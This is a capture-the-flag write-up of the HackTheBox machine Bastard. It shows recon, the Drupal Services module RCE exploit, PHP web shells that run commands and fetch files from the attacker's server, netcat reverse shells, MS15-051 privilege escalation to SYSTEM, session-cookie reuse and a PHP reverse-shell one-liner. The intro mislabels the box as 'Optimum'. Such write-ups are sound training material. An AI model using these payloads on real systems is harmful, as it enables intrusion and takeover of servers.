---
title: "Walk-through of Bastard from HackTheBox"
header:
  teaser: /assets/images/2020-07-03-16-01-28.png
toc: true
toc_sticky: true
excerpt_separator:  <!--more-->
categories:
  - CTF
tags:
  - HTB
  - CTF
  - Drupal
  -
  - Windows
---

## Machine Information

![Bastard](/assets/images/2020-07-03-16-01-28.png)

Optimum is rated easy and mainly focuses on enumeration of services with known exploits. There are Metasploit modules for the exploits, making this box relatively easy to complete. To make it more interesting I have chosen to complete it via other means. Skills required are basic knowledge of Windows, and enumerating ports and services. Skills learned are identifying vulnerable services and using basic Windows privilege escalation techniques.

<!--more-->

| Details |  |
| --- | --- |
| Hosting Site | [HackTheBox](https://www.hackthebox.eu/) |
| Link To Machine | [HTB - 007 - Medium - Bastard](https://www.hackthebox.eu/home/machines/profile/7) |
| Machine Release Date | 18th March 2017 |
| Date I Completed It | 22nd October 2019 |
| Distribution used | Kali 2019.1 – [Release Info](https://www.kali.org/news/kali-linux-2019-1-release/) |

## Initial Recon

As always, start with Nmap:

```text
root@kali:~/htb/bastard# ports=$(nmap -p- --min-rate=1000 -T4 10.10.10.9 | grep ^[0-9] | cut -d '/' -f 1 | tr '\n' ',' | sed s/,$//)
root@kali:~/htb/bastard# nmap -p$ports -v -sC -sV -oA bastard 10.10.10.9
Starting Nmap 7.80 ( https://nmap.org ) at 2019-10-22 10:54 EDT
Initiating Ping Scan at 10:54
Scanning 10.10.10.9 [4 ports]
Completed Ping Scan at 10:54, 0.06s elapsed (1 total hosts)
Initiating Parallel DNS resolution of 1 host. at 10:54
Completed Parallel DNS resolution of 1 host. at 10:54, 0.02s elapsed
Initiating SYN Stealth Scan at 10:54
Scanning 10.10.10.9 [3 ports]
Discovered open port 80/tcp on 10.10.10.9
Discovered open port 135/tcp on 10.10.10.9
Discovered open port 49154/tcp on 10.10.10.9
Completed SYN Stealth Scan at 10:54, 0.07s elapsed (3 total ports)
Initiating Service scan at 10:54
Scanning 3 services on 10.10.10.9
Completed Service scan at 10:55, 54.06s elapsed (3 services on 1 host)
Nmap scan report for 10.10.10.9
Host is up (0.027s latency).
PORT      STATE SERVICE VERSION
80/tcp    open  http    Microsoft IIS httpd 7.5
|_http-favicon: Unknown favicon MD5: CF2445DCB53A031C02F9B57E2199BC03
|_http-generator: Drupal 7 (http://drupal.org)
| http-methods:
|   Supported Methods: OPTIONS TRACE GET HEAD POST
|_  Potentially risky methods: TRACE
| http-robots.txt: 36 disallowed entries (15 shown)
| /includes/ /misc/ /modules/ /profiles/ /scripts/
| /themes/ /CHANGELOG.txt /cron.php /INSTALL.mysql.txt
| /INSTALL.pgsql.txt /INSTALL.sqlite.txt /install.php /INSTALL.txt
|_/LICENSE.txt /MAINTAINERS.txt
|_http-server-header: Microsoft-IIS/7.5
|_http-title: Welcome to 10.10.10.9 | 10.10.10.9
135/tcp   open  msrpc   Microsoft Windows RPC
49154/tcp open  msrpc   Microsoft Windows RPC
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows
Read data files from: /usr/bin/../share/nmap
Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 64.50 seconds
           Raw packets sent: 7 (284B) | Rcvd: 4 (160B)
```

The scan confirms this is a Windows box, with IIS 7.5, so will be Windows Server 2008R2 - [Info here](https://support.microsoft.com/en-gb/help/224609/how-to-obtain-versions-of-internet-information-server-iis)

Have a look at port 80 first:

![bastard_website](/assets/images/2020-07-03-16-08-36.png)

Shows it's a default install of Drupal, try running droopescan and see what we can find:

```text
root@kali:~/htb/bastard# apt-get install python-pip     <-- new kali so not installed yet
root@kali:~/htb/bastard# git clone https://github.com/droope/droopescan.git
root@kali:~/htb/bastard# cd droopescan
root@kali:~/htb/bastard/droopescan# pip install -r requirements.txt
root@kali:~/htb/bastard/droopescan# ./droopescan scan drupal -u 10.10.10.9
[+] Themes found:
    seven http://10.10.10.9/themes/seven/
    garland http://10.10.10.9/themes/garland/
[+] Possible interesting urls found:
    Default changelog file - http://10.10.10.9/CHANGELOG.txt
    Default admin - http://10.10.10.9/user/login
[+] Possible version(s):
    7.54
[+] Plugins found:
    ctools http://10.10.10.9/sites/all/modules/ctools/
        http://10.10.10.9/sites/all/modules/ctools/CHANGELOG.txt
        http://10.10.10.9/sites/all/modules/ctools/changelog.txt
        http://10.10.10.9/sites/all/modules/ctools/CHANGELOG.TXT
        http://10.10.10.9/sites/all/modules/ctools/LICENSE.txt
        http://10.10.10.9/sites/all/modules/ctools/API.txt
    libraries http://10.10.10.9/sites/all/modules/libraries/
        http://10.10.10.9/sites/all/modules/libraries/CHANGELOG.txt
        http://10.10.10.9/sites/all/modules/libraries/changelog.txt
        http://10.10.10.9/sites/all/modules/libraries/CHANGELOG.TXT
        http://10.10.10.9/sites/all/modules/libraries/README.txt
        http://10.10.10.9/sites/all/modules/libraries/readme.txt
        http://10.10.10.9/sites/all/modules/libraries/README.TXT
        http://10.10.10.9/sites/all/modules/libraries/LICENSE.txt
    services http://10.10.10.9/sites/all/modules/services/
        http://10.10.10.9/sites/all/modules/services/README.txt
        http://10.10.10.9/sites/all/modules/services/readme.txt
        http://10.10.10.9/sites/all/modules/services/README.TXT
        http://10.10.10.9/sites/all/modules/services/LICENSE.txt
    image http://10.10.10.9/modules/image/
    profile http://10.10.10.9/modules/profile/
    php http://10.10.10.9/modules/php/
[+] Scan finished (0:46:17.029916 elapsed)
```

From above the default file in Drupal is CHANGELOG.txt, having a look we see: Drupal 7.54, 2017-02-01
Google that for exploit and [find this.](https://www.ambionics.io/blog/drupal-services-module-rce) Looks complicated, so see if there is anything in Exploit-DB:

```text
root@kali:~/htb/bastard# searchsploit drupal
--------------------------------------------------------------------------------------------------------------------------------------------------------------------- ----------------------------------------
 Exploit Title                                                                                                                                                       |  Path
                                                                                                                                                                     | (/usr/share/exploitdb/)
--------------------------------------------------------------------------------------------------------------------------------------------------------------------- ----------------------------------------
Drupal 7.0 < 7.31 - 'Drupalgeddon' SQL Injection (Add Admin User)                                                                                            | exploits/php/webapps/34992.py
Drupal 7.0 < 7.31 - 'Drupalgeddon' SQL Injection (Admin Session)                                                                                               | exploits/php/webapps/44355.php
Drupal 7.0 < 7.31 - 'Drupalgeddon' SQL Injection (PoC) (Reset Password) (1)                                                                             | exploits/php/webapps/34984.py
Drupal 7.0 < 7.31 - 'Drupalgeddon' SQL Injection (PoC) (Reset Password) (2)                                                                            | exploits/php/webapps/34993.php
Drupal 7.0 < 7.31 - 'Drupalgeddon' SQL Injection (Remote Code Execution)                                                                              | exploits/php/webapps/35150.php
Drupal 7.12 - Multiple Vulnerabilities                                                                                                                                                 | exploits/php/webapps/18564.txt
Drupal 7.x Module Services - Remote Code Execution                                                                                                                   | exploits/php/webapps/41564.php
Drupal < 7.34 - Denial of Service                                                                                                                                                          | exploits/php/dos/35415.txt
Drupal < 7.58 - 'Drupalgeddon3' (Authenticated) Remote Code (Metasploit)                                                                            | exploits/php/webapps/44557.rb
Drupal < 7.58 - 'Drupalgeddon3' (Authenticated) Remote Code Execution (PoC)                                                                      | exploits/php/webapps/44542.txt
Drupal < 7.58 / < 8.3.9 / < 8.4.6 / < 8.5.1 - 'Drupalgeddon2' Remote Code Execution                                                               | exploits/php/webapps/44449.rb
--------------------------------------------------------------------------------------------------------------------------------------------------------------------- ----------------------------------------
```

Lots of options but 41564 is the same as the one I already found above so try that:

```text
root@kali:~/htb/bastard# searchsploit -m exploits/php/webapps/41564.php
  Exploit: Drupal 7.x Module Services - Remote Code Execution
      URL: https://www.exploit-db.com/exploits/41564
     Path: /usr/share/exploitdb/exploits/php/webapps/41564.php
File Type: ASCII text, with CRLF line terminators
Copied to: /root/htb/bastard/41564.php
```

Need to install php-curl before script will work:

```text
root@kali:~/htb/bastard# apt-get install php-curl
```

Now need to edit script before running:

```text
root@kali:~/htb/bastard# cat 41564.php
<SNIP>
curl = 'http://10.10.10.9';
$endpoint_path = '/rest';
$endpoint = 'rest_endpoint';

$file = [
    'filename' => 'test.php',
    'data' => '<?php system($_REQUEST["cmd"]); ?>'
];
<SNIP>
```

Above are the sections to change. Now run exploit and test it worked:

```text
root@kali:~/htb/bastard# php 41564.php
# Exploit Title: Drupal 7.x Services Module Remote Code Execution
# Vendor Homepage: https://www.drupal.org/project/services
# Exploit Author: Charles FOL
# Contact: https://twitter.com/ambionics
# Website: https://www.ambionics.io/blog/drupal-services-module-rce
#!/usr/bin/php
Stored session information in session.json
Stored user information in user.json
Cache contains 7 entries
File written: http://10.10.10.9/test.php

root@kali:~/htb/bastard# curl http://10.10.10.9/test.php?cmd=whoami
nt authority\iusr
```

So have iusr accessible via exploit, now connect it to a reverse shell with 64bit netcat for Windows:

```text
root@kali:~/htb/bastard# wget https://github.com/phackt/pentest/raw/master/privesc/windows/nc64.exe
```

Start smbserver so can pull file from box:

```text
root@kali:~/htb/bastard# python /opt/impacket/examples/smbserver.py share /root/htb/bastard/
```

Grab rlwarap (useful to format output of NC better) then start a NC listening:

```text
root@kali:~/htb/bastard# apt install rlwrap
root@kali:~/htb/machines/bastard# rlwrap nc -lnvp 443
listening on [any] 443 ...
```

Browse to my uploaded exploit php page here:

```text
http://10.10.10.9/test.php?cmd=\\10.10.14.34\share\nc64.exe%20-e%20cmd.exe%2010.10.14.34%20443
```

Now switch back to NC:

```text
connect to [10.10.14.34] from (UNKNOWN) [10.10.10.9] 49264
Microsoft Windows [Version 6.1.7600]
Copyright (c) 2009 Microsoft Corporation.  All rights reserved.

C:\inetpub\drupal-7.54>whoami
nt authority\iusr

C:\inetpub\drupal-7.54>type c:\users\dimitris\desktop\user.txt
type c:\users\dimitris\desktop\user.txt
<<HIDDEN>>
```

Check for service packs/patches:

```text
C:\inetpub\drupal-7.54>systeminfo
systeminfo

Host Name:                 BASTARD
OS Name:                   Microsoft Windows Server 2008 R2 Datacenter
OS Version:                6.1.7600 N/A Build 7600
OS Manufacturer:           Microsoft Corporation
OS Configuration:          Standalone Server
OS Build Type:             Multiprocessor Free
Registered Owner:          Windows User
Registered Organization:
Product ID:                00496-001-0001283-84782
Original Install Date:     18/3/2017, 7:04:46
System Boot Time:          22/10/2019, 5:48:22
System Manufacturer:       VMware, Inc.
System Model:              VMware Virtual Platform
System Type:               x64-based PC
Processor(s):              2 Processor(s) Installed.
                           [01]: AMD64 Family 23 Model 1 Stepping 2 AuthenticAMD ~2000 Mhz
                           [02]: AMD64 Family 23 Model 1 Stepping 2 AuthenticAMD ~2000 Mhz
BIOS Version:              Phoenix Technologies LTD 6.00, 12/12/2018
Windows Directory:         C:\Windows
System Directory:          C:\Windows\system32
Boot Device:               \Device\HarddiskVolume1
System Locale:             el;Greek
Input Locale:              en-us;English (United States)
Time Zone:                 (UTC+02:00) Athens, Bucharest, Istanbul
Total Physical Memory:     2.047 MB
Available Physical Memory: 1.590 MB
Virtual Memory: Max Size:  4.095 MB
Virtual Memory: Available: 3.618 MB
Virtual Memory: In Use:    477 MB
Page File Location(s):     C:\pagefile.sys
Domain:                    HTB
Logon Server:              N/A
Hotfix(s):                 N/A
Network Card(s):           1 NIC(s) Installed.
                           [01]: Intel(R) PRO/1000 MT Network Connection
                                 Connection Name: Local Area Connection
                                 DHCP Enabled:    No
                                 IP address(es)
                                 [01]: 10.10.10.9
```

So base install of Server 2008R2, which means it's vulnerable to [MS015-51](https://www.exploit-db.com/exploits/37049), grab a version from GitHub:

```text
root@kali:~/htb/bastard# wget https://github.com/SecWiki/windows-kernel-exploits/raw/master/MS15-051/MS15-051-KB3045171.zip
```

Close first shell and browse to uploaded php file again, but this time use the MS15-51 exploit to launch my shell, which connects me as root:

```text
http://10.10.10.9/test.php?cmd=\\10.10.14.34\share\ms15-051x64.exe%20%22\\10.10.14.34\share\nc64.exe%20-e%20cmd.exe%2010.10.14.34%20443%22
```

Have an NC waiting, and we see the connection as system:

```text
root@kali:~/htb/bastard# rlwrap nc -lvnp 443
listening on [any] 443 ...
connect to [10.10.14.34] from (UNKNOWN) [10.10.10.9] 49275
Microsoft Windows [Version 6.1.7600]
Copyright (c) 2009 Microsoft Corporation.  All rights reserved.

C:\inetpub\drupal-7.54>whoami
whoami
nt authority\system

C:\inetpub\drupal-7.54>dir c:\users\administrator\desktop
dir c:\users\administrator\desktop
 Volume in drive C has no label.
 Volume Serial Number is 605B-4AAA
 Directory of c:\users\administrator\desktop
19/03/2017  08:33       <DIR>          .
19/03/2017  08:33       <DIR>          ..
19/03/2017  08:34                   32 root.txt.txt
               1 File(s)             32 bytes
               2 Dir(s)  30.816.452.608 bytes free

C:\inetpub\drupal-7.54>type c:\users\administrator\desktop\root.txt.txt
type c:\users\administrator\desktop\root.txt.txt
<<HIDDEN>>
```

## Alternative IPPSEC version

Start by editing 41564.php so it looks like this:

```text
<SNIP>
$phpcode = <<< 'EOD'
<?php
    if (isset($_REQUEST['fupload'])) {
        file_put_contents($_REQUEST['fupload'], file_get_contents("http://10.10.14.34:8000/" . $_REQUEST['fupload']));
    };
    if (isset($_REQUEST['fexec'])) {
        echo "<pre" . shell_exec($_REQUEST['fexec']) . "</pre>";
    };
?>
EOD;

$file = [
    'filename' => 'spen.php',
    'data' => $phpcode
];
<SNIP>
```

Run exploit to upload the file:

```text
root@kali:~/htb/bastard# php 41564.php
# Exploit Title: Drupal 7.x Services Module Remote Code Execution
# Vendor Homepage: https://www.drupal.org/project/services
# Exploit Author: Charles FOL
# Contact: https://twitter.com/ambionics
# Website: https://www.ambionics.io/blog/drupal-services-module-rce
#!/usr/bin/php
Stored session information in session.json
Stored user information in user.json
Cache contains 7 entries
File written: http://10.10.10.9/spen.php
```

Check file uploaded is working:

![website_fexec](/assets/images/2020-07-03-16-09-35.png)

Browse to the url here:

```text
http://10.10.10.9/spen.php?fupload=nc64.exe&fexec=nc64.exe%20-e%20cmd%2010.10.14.34%208081%22
```

Switch to a waiting NC:

```text
root@kali:~/htb/bastard# nc -lnvp 8081
listening on [any] 8081 ...
connect to [10.10.14.34] from (UNKNOWN) [10.10.10.9] 49214
Microsoft Windows [Version 6.1.7600]
Copyright (c) 2009 Microsoft Corporation.  All rights reserved.
C:\inetpub\drupal-7.54>whoami
whoami
nt authority\iusr
```

Now browse to:

```text
http://10.10.10.9/spen.php?fupload=ms15-051x64.exe&fexec=ms15-051x64.exe%20%22nc64.exe%20-e%20cmd%2010.10.14.34%208082%22
```

Look at the second waiting NC:

```text
root@kali:~/htb/bastard# nc -lvnp 8082
listening on [any] 8082 ...
connect to [10.10.14.34] from (UNKNOWN) [10.10.10.9] 49219
Microsoft Windows [Version 6.1.7600]
Copyright (c) 2009 Microsoft Corporation.  All rights reserved.
C:\inetpub\drupal-7.54>whoami
whoami
nt authority\system
```

We now have a root shell, but the process was much quicker.

## Alternative way to get code execution

Can also use the session.json file that was created to get logged in as admin via the web portal:

```text
root@kali:~/htb/bastard# cat session.json
{
    "session_name": "SESSd873f26fc11f2b7e6e4aa0f6fce59913",
    "session_id": "Jjuqrl2jqnNT8VYXW9emut0jgs_NJk3BoCdUVzT38Tw",
    "token": "wQhTWwJMQapi9SUUeYi2lyP5y0wkdwYb5Tn-acjBODg"
}
```

Use the session name and id to create a cookie in Firefox:

![bastard_cookie](/assets/images/2020-07-03-16-10-35.png)

Now browse to http://10.10.10.9 and will have an admin session established using the cookie we've created, so no need to login:

![bastard_admin](/assets/images/2020-07-03-16-10-57.png)

Now go to Modules and enable PHP filter:

![drupal_modules](/assets/images/2020-07-03-17-23-19.png)

Can now click Add content, then create an article with body containing our php code:

![drupal_add_content](/assets/images/2020-07-03-16-12-09.png)

Make sure text format is set as PHP code, then click preview and see we have code execution:

![drupal_code_execution](/assets/images/2020-07-03-16-12-42.png)

I could now use this method to initiate a reverse shell, by pasting the php code for one such as this from PentestMonkey:

```text
php -r '$sock=fsockopen("10.0.0.1",1234);exec("/bin/sh -i <&3 >&3 2>&3");'
```
